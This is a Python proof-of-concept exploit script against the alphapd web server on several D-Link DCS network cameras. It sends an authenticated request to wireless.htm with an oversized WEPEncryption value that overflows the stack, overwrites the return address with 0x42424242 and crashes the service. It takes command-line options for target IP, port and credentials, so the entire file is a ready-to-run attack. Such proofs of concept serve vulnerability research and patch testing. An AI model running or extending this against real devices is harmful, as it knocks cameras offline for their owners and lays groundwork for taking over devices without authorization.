import argparse
import requests
from requests.auth import HTTPBasicAuth
from requests.auth import HTTPDigestAuth

# Exploit a vulnerability in the multiple DLink DCS cameras containing
# alphapd server.
# Vulnerability is requesting wireless.htm with a large string in the 
# WEPEncryption variable
#
# This code causes alphapd to crash because it writes 0x42424242 to $ra. 


def exploit_target(target_ip, target_port, digest, basic, username, 
                   password):
    """
    Perform target exploitation.

    :param target_ip: IP address of the target.
    :type target_ip: str

    :param target_port: Listening port of alphapd.
    :type target_port: str

    :param digest: Perform digest authentication.
    :type digest: bool
    
    :param basic: Perform HTTP basic authentication.
    :type basic: bool

    :param username: Username for HTTP authentication.
    :type username: str

    :param password: Password for HTTP authentication.
    :type password: str
    """
    if (digest and basic) or (not digest and not basic):
        raise Exception('Either digest or basic authentication must be given, \
                         but not both.')

    overflow_char = 'A' 

    overflow = overflow_char * 0x28 + 'BBBB' 

    # Must have a value in the referer field of the HTTP header or a request
    # Forbidden is returned. Doesn't seem to like if port 80 is in the referer 
    # field so handle it differently here.
    if target_port == '80':
        url = 'http://%s/wireless.htm?WEPEncryption=%s' % (target_ip, overflow)
        referer = 'http://%s/wizard.htm' % target_ip
    else:
        url = 'http://%s:%s/wireless.htm?WEPEncryption=%s' % (target_ip, 
                                                              target_port, 
                                                              overflow)
        referer = 'http://%s:%s/wizard.htm' % (target_ip, target_port)

    if basic:
        auth = HTTPBasicAuth(username, password)
    else:
        auth = HTTPDigestAuth(username, password)

    try:
        requests.get(url, auth=auth, headers={'Referer': referer})
    except:
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    parser.add_argument('-i', '--ip', help='Target IP address.')
    parser.add_argument('-P', '--port', help='Target Port.', default='80')
    parser.add_argument('-u', '--user', help='Username for authentication', 
                        default='admin')
    parser.add_argument('-p', '--password', help='Password for authentication.',
                        default='')
    parser.add_argument('-d', '--digest', help='HTTP digest authentication.', 
                        default=False, action='store_true')
    parser.add_argument('-b', '--basic', help='HTTP basic authentication.', 
                        default=False, action='store_true')

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.digest, args.basic, 
                   args.user, args.password)

